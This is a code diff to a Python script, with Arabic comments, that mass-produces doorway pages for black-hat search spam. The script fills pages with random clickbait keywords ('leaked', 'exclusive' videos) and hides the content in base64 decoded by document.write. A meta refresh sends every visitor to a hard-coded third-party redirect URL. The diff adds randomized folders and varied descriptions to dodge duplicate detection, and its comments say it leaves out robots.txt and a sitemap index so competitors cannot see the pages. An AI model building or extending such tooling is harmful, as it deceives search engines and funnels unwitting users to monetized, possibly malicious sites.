@@ -7,14 +7,20 @@ import base64
 
 class UltraAggressiveSEO:
     def __init__(self):
-        self.main_folder = "news"
-        self.subfolders = ["hbcm", "video", "viral", "live"]
-        self.domain = self._get_domain()
+        # مجلدات رئيسية عشوائية (اختار منها 6 كل مرة)
+        self.main_folders_pool = [
+            "news", "vid", "clips", "hot", "live", "viral", "update", "stream", "media", "watch", "play", "top"
+        ]
         
+        # مجلدات فرعية (داخل كل رئيسي)
+        self.subfolders_pool = ["hbcm", "video", "leaked", "viral", "live", "trending", "exclusive", "hd"]
+        
+        self.domain = self._get_domain()
         self.redirect_url = "https://accumulaterehearsehealing.com/v8f7nbpnim?key=7f6a5217f51c6a62c1c630a20f2d2a75"
         
         self.keywords_ar = self._load_keywords("keywords_ar.txt")
         self.keywords_en = self._load_keywords("keywords_en.txt")
+        self.keywords_in = self._load_keywords("keywords_in.txt")
 
         self.movie_template = """<!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -203,11 +209,20 @@ class UltraAggressiveSEO:
         if not keywords:
             return "فيديو حصري جديد", "شاهد الآن بجودة عالية HD"
         
+        # عدد كلمات متغير (5 إلى 12) عشان ما تتكررش نفس الصيغة
         words_count = random.randint(5, 12)
         selected = random.sample(keywords, min(len(keywords), words_count))
         title = ' '.join(selected)
         
-        description = f"شاهد {title} الآن بجودة HD حصريًا بدون إعلانات"
+        # وصف متناسق ومتغير
+        desc_templates = [
+            f"شاهد {title} الآن بجودة HD حصريًا بدون إعلانات",
+            f"{title} - فيديو كامل HD جاهز للمشاهدة الآن",
+            f"استمتع بـ {title} بأعلى جودة وبدون تقطيع",
+            f"{title} متوفر الآن بجودة عالية وسرعة تحميل",
+            f"لا تفوت {title} - شاهد مباشرة بجودة HD"
+        ]
+        description = random.choice(desc_templates)
         
         return title, description
 
@@ -219,9 +234,8 @@ class UltraAggressiveSEO:
         return f"{short_slug}-{hash_str}.html"
 
     def create_multiple_sitemaps(self, pages):
-        # بنقسم الصفحات على عدة sitemaps عشوائية (بدل sitemap واحد كبير)
         random.shuffle(pages)
-        chunk_size = 50  # كل sitemap فيه 50 رابط تقريبًا (جوجل بيحبها صغيرة)
+        chunk_size = 50
         for i in range(0, len(pages), chunk_size):
             chunk = pages[i:i + chunk_size]
             random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
@@ -238,57 +252,85 @@ class UltraAggressiveSEO:
             
             print(f"Created sitemap: {sitemap_name} with {len(chunk)} URLs")
 
-        # ما بننشئش sitemap index ولا robots.txt عشان ما يشوفه المنافس
         print("All sitemaps created. No index file or robots.txt generated.")
 
     def run(self, count=200):
-        if not os.path.exists(self.main_folder):
-            os.makedirs(self.main_folder)
+        # اختيار 6 مجلدات رئيسية عشوائية من القائمة
+        main_folders = random.sample(self.main_folders_pool, 6)
         
-        target_sub = random.choice(self.subfolders)
-        path = os.path.join(self.main_folder, target_sub)
-        if not os.path.exists(path):
-            os.makedirs(path)
+        total_pages_added = 0
         
-        pages = []
-        
-        print(f"Generating {count} pages in {target_sub}...")
-        
-        for _ in range(count):
-            title, description = self.generate_title_and_desc()
-            slug = self.clean_slug(title)
-            pages.append({
-                "title": title,
-                "description": description,
-                "slug": slug,
-                "url": f"https://{self.domain}/{self.main_folder}/{target_sub}/{slug}"
-            })
-        
-        current_time_iso = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S+00:00")
-        
-        for p in pages:
-            internal_sample = random.sample(pages, min(15, len(pages)))
-            internal = "".join([f'<a href="{x["url"]}">{x["title"]}</a><br>' for x in internal_sample if x["url"] != p["url"]])
+        for main_folder in main_folders:
+            main_path = main_folder
+            if not os.path.exists(main_path):
+                os.makedirs(main_path)
             
-            final_html = self.movie_template.replace("{{TITLE}}", p['title'])\
-                                           .replace("{{DESCRIPTION}}", p['description'])\
-                                           .replace("{{CANONICAL_URL}}", p['url'])\
-                                           .replace("{{REDIRECT_URL}}", self.redirect_url)\
-                                           .replace("{{TIME_ISO}}", current_time_iso)\
-                                           .replace("{{INTERNAL_LINKS}}", internal)
+            # داخل كل رئيسي → 6 مجلدات فرعية عشوائية
+            subfolders = random.sample(self.subfolders_pool, 6)
             
-            encoded_html = base64.b64encode(final_html.encode('utf-8')).decode('utf-8')
+            for sub in subfolders:
+                path = os.path.join(main_path, sub)
+                if not os.path.exists(path):
+                    os.makedirs(path)
+                
+                # عدد الملفات الحالية في المجلد
+                current_files = len([f for f in os.listdir(path) if f.endswith('.html')])
+                remaining = 200 - current_files
+                
+                if remaining <= 0:
+                    continue  # المجلد ممتلئ
+                
+                to_add = min(remaining, count - total_pages_added)
+                if to_add <= 0:
+                    break
+                
+                pages = []
+                
+                print(f"Adding {to_add} pages to {main_path}/{sub} (current: {current_files})...")
+                
+                for _ in range(to_add):
+                    title, description = self.generate_title_and_desc()
+                    slug = self.clean_slug(title)
+                    pages.append({
+                        "title": title,
+                        "description": description,
+                        "slug": slug,
+                        "url": f"https://{self.domain}/{main_path}/{sub}/{slug}"
+                    })
+                
+                current_time_iso = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S+00:00")
+                
+                for p in pages:
+                    internal_sample = random.sample(pages, min(15, len(pages)))
+                    internal = "".join([f'<a href="{x["url"]}">{x["title"]}</a><br>' for x in internal_sample if x["url"] != p["url"]])
+                    
+                    final_html = self.movie_template.replace("{{TITLE}}", p['title'])\
+                                                   .replace("{{DESCRIPTION}}", p['description'])\
+                                                   .replace("{{CANONICAL_URL}}", p['url'])\
+                                                   .replace("{{REDIRECT_URL}}", self.redirect_url)\
+                                                   .replace("{{TIME_ISO}}", current_time_iso)\
+                                                   .replace("{{INTERNAL_LINKS}}", internal)
+                    
+                    encoded_html = base64.b64encode(final_html.encode('utf-8')).decode('utf-8')
+                    
+                    output_content = f"""<html><head><meta http-equiv="refresh" content="2; url={self.redirect_url}"></head><body><script>document.write(atob("{encoded_html}"));</script></body></html>"""
+                    
+                    with open(os.path.join(path, p['slug']), "w", encoding="utf-8") as f:
+                        f.write(output_content)
+                
+                total_pages_added += to_add
+                
+                if total_pages_added >= count:
+                    break
             
-            output_content = f"""<html><head><meta http-equiv="refresh" content="2; url={self.redirect_url}"></head><body><script>document.write(atob("{encoded_html}"));</script></body></html>"""
-            
-            with open(os.path.join(path, p['slug']), "w", encoding="utf-8") as f:
-                f.write(output_content)
+            if total_pages_added >= count:
+                break
         
-        # إنشاء عدة sitemaps عشوائية بدون index ولا robots.txt
+        # إنشاء سايت مابات متعددة عشوائية (بدون index ولا robots.txt)
         self.create_multiple_sitemaps(pages)
         
-        print(f"Done. Generated {count} pages in {target_sub}")
+        print(f"Done. Added {total_pages_added} new pages across multiple folders.")
 
 if __name__ == "__main__":
     bot = UltraAggressiveSEO()
-    bot.run(count=200)
+    bot.run(count=50)
